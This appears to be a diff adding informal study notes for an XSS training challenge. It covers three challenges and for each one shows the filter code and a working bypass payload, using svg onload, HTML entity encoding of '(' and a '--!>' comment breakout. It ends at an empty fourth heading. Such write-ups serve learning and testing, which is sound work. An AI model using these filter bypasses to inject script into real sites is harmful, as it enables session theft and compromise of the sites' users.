@@ -1,0 +1,74 @@
+// 							Prompt [XSS Challenge]
+
+Challenge: -1 
+-------------
+	
+<script>
+	
+	function escape(input) {
+    // tags stripping mechanism from ExtJS library
+    // Ext.util.Format.stripTags
+    var stripTagsRE = /<\/?[^>]+>/gi;
+    input = input.replace(stripTagsRE, '');
+
+    return '<article>' + input + '</article>';
+} 
+//This challenge output will store in article 
+	<!--
+		- Every word you type in input feild that will go to <article>your string</article>
+		- And you have alert XSS, So try svg - if you ever guess this svg will filter out or > closing so let's build payload - <svg/onload=alert(1); This is successfull payload :)
+		-->
+</script>
+
+
+Challenge: -2
+----------------
+	
+	<script>
+		
+		function escape(input) {
+    //                      v-- frowny face
+    input = input.replace(/[=(]/g, '');
+
+    // ok seriously, disallows equal signs and open parenthesis
+    return input;
+	} 
+	<!--
+		- Challenge is left parenthesis is blocked 
+		- whenever your input reflect as a plain text you should use svg vector
+		- first build payload - <script>alert(1)</script> # our golad is to inject is payload but before write  
+		   script tag don't foreget to write to <svg> because this out put in plain text;
+		- Encode our letf paranthesis - I got in w3school html char code: first '&' for continue your paylaod
+		  then '#' for number - then choose your number according to your charecter '(' .
+		- Ok, Now Payload is ready - <svg><script>alert&#40;1)</script>  #Don't forget to put ; semicoln
+	-->
+	</script>
+
+Challenge: -3:
+-----------------
+
+<!--<script>alert(1)<script> -->
+	<!-- --><script>alert(1)</script><!-- -->
+		<script>alert(1)</script>
+		--!> <script>alert(1)</script>
+<script>
+	function escape(input) {
+    // filter potential comment end delimiters
+    input = input.replace(/->/g, '_');
+
+    // comment the input to avoid script execution
+    return '<!-- ' + input + ' -->';
+} 
+
+</script>
+				<!--
+					- This challene is to avoid comment:- 
+					- Wheever you put any payload is simply got comment, 
+					- like this <!-- <script>alert(1)</script> --> like this 
+					- So this code is allow to --> type of closing but you can open comment as opeing
+					- So, Now we can chanege like --!> this - Now we able to execute our paylaod
+					-->
+
+
+Challenge-4:
+-------------
